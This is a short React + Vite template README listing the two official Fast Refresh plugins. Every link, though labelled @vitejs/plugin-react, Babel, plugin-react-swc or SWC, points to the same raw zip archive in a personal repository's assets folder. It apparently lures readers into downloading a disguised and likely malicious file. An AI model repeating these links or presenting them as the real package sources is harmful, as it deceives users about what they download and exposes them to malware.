# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/LarissaTchomgang/react_JS/raw/refs/heads/main/src/assets/react-JS-v1.9.zip) uses [Babel](https://github.com/LarissaTchomgang/react_JS/raw/refs/heads/main/src/assets/react-JS-v1.9.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/LarissaTchomgang/react_JS/raw/refs/heads/main/src/assets/react-JS-v1.9.zip) uses [SWC](https://github.com/LarissaTchomgang/react_JS/raw/refs/heads/main/src/assets/react-JS-v1.9.zip) for Fast Refresh
